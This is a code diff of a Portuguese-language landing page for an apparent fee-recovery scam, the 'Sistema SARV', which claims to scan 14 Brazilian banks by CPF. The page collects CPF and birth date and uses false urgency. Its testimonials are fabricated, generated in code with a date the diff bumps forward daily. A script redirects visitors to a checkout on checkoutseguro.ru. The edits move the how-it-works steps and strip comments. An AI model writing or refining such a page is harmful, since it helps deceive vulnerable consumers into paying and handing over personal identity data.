@@ -196,6 +196,23 @@
                 <p class="roberto-text">O Sistema SARV faz uma varredura completa no seu CPF em busca de valores acumulados por tarifas indevidas e cesta de serviços. Estou liberando o acesso para você hoje, mas precisa ser rápido: meu login será excluído desse servidor hoje à meia-noite.</p>
             </div>
 
+            <!-- BLOCO PASSO A PASSO MOVIDO PARA CÁ -->
+            <div class="steps">
+                <div class="depo-title" style="border:none; padding:0;">Como funciona — passo a passo:</div>
+                <div class="step-item">
+                    <div class="step-num">1</div>
+                    <div class="step-info"><b>Consulta Gratuita</b><p>Nosso scanner varre 14 instituições bancárias em tempo real usando seu CPF.</p></div>
+                </div>
+                <div class="step-item">
+                    <div class="step-num">2</div>
+                    <div class="step-info"><b>Cálculo de Tarifas</b><p>Localizamos cobranças indevidas e juros acumulados em contas ativas ou inativas.</p></div>
+                </div>
+                <div class="step-item">
+                    <div class="step-num">3</div>
+                    <div class="step-info"><b>Saque Imediato</b><p>Configure sua chave PIX para que o sistema realize o depósito automático do valor recuperado diretamente na sua conta bancária.</p></div>
+                </div>
+            </div>
+
             <div class="form-card" id="main-form">
                 <h2>Preencha seus dados para consultar</h2>
                 
@@ -237,23 +254,6 @@
             </div>
 
             <button class="btn-more" id="btn-load-more" onclick="loadMoreDepos()">Ver mais depoimentos</button>
-
-            <div class="steps">
-                <div class="depo-title" style="border:none; padding:0;">Como funciona — passo a passo:</div>
-                <div class="step-item">
-                    <div class="step-num">1</div>
-                    <div class="step-info"><b>Consulta Gratuita</b><p>Nosso scanner varre 14 instituições bancárias em tempo real usando seu CPF.</p></div>
-                </div>
-                <div class="step-item">
-                    <div class="step-num">2</div>
-                    <div class="step-info"><b>Cálculo de Tarifas</b><p>Localizamos cobranças indevidas e juros acumulados em contas ativas ou inativas.</p></div>
-                </div>
-                <div class="step-item">
-                    <div class="step-num">3</div>
-                    <div class="step-info"><b>Saque Imediato</b><p>Configure sua chave PIX para que o sistema realize o depósito automático do valor recuperado diretamente na sua conta bancária.</p></div>
-                </div>
-                <button class="btn-main" style="margin-top:20px;" onclick="document.getElementById('main-form').scrollIntoView({behavior: 'smooth'})">REVELAR MEU SALDO DISPONÍVEL</button>
-            </div>
         </div>
 
         <div id="step-2" style="display: none;">
@@ -366,28 +366,22 @@
     </div>
 
     <script>
-        // Função de Redirecionamento com Carregamento e Link Novo
         function finalizarSaque() {
             if(typeof fbq === 'function') {
                 fbq('track', 'InitiateCheckout');
             }
-
             document.getElementById('loader-redirect').style.display = 'flex';
-
             setTimeout(function() {
-                // Link atualizado conforme solicitado
                 window.location.href = "https://checkoutseguro.ru/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O";
             }, 2500);
         }
 
-        // Mascara CPF
         document.getElementById('cpf').addEventListener('input', e => {
             let v = e.target.value.replace(/\D/g, '');
             if (v.length > 11) v = v.slice(0, 11);
             e.target.value = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
         });
 
-        // Mascara Data de Nascimento
         document.getElementById('nascimento').addEventListener('input', e => {
             let v = e.target.value.replace(/\D/g, '');
             if (v.length > 8) v = v.slice(0, 8);
@@ -419,7 +413,7 @@
 
         function loadMoreDepos() {
             const container = document.getElementById('depo-container');
-            const hoje = "13/05/2026";
+            const hoje = "14/05/2026";
             const novos = [
                 {n: "Sandra Regina Passos", l: hoje, v: "1.650,10", t: "Fiz a consulta e o valor do Santander que está inativo apareceu. Fiz o saque e caiu tudo certinho na minha conta."},
                 {n: "Luiz Moreira", l: hoje, v: "1.120,45", t: "Estava precisando muito desse dinheiro pois meu aluguel estava atrasado. O sistema é muito rápido."},
